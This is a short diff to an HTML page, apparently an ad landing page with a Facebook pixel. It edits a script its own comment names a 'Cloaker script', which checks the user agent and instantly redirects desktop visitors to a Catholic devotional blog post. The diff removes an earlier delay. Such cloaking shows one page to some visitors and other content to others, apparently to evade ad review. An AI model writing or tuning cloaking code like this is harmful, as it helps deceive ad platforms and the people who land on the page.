@@ -32,18 +32,16 @@
            src="https://www.facebook.com/tr?id=1299418058437952&ev=PageView&noscript=1" />
     </noscript>
 
-    <!-- Cloaker script with redirect delay for desktop only -->
+    <!-- Cloaker script for desktop redirect (no delay) -->
     <script type="text/javascript">
-      setTimeout(function() {
-        var url_link_redirect_pc = "https://blog.avemaria.com.br/blog/devocao-mariana-produtos-religiosos-espiritualidade/9-dicas-para-ser-mais-intimo-de-nossa-senhora-65/";
-        function isMobile() {
-          const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
-          return regex.test(navigator.userAgent);
-        }
-        if (!isMobile()) {
-          window.location = url_link_redirect_pc;
-        }
-      }, 300); // Atraso de 1 segundo para garantir que o Pixel carregue
+      var url_link_redirect_pc = "https://blog.avemaria.com.br/blog/devocao-mariana-produtos-religiosos-espiritualidade/9-dicas-para-ser-mais-intimo-de-nossa-senhora-65/";
+      function isMobile() {
+        const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+        return regex.test(navigator.userAgent);
+      }
+      if (!isMobile()) {
+        window.location = url_link_redirect_pc;
+      }
     </script>
   </body>
 </html>
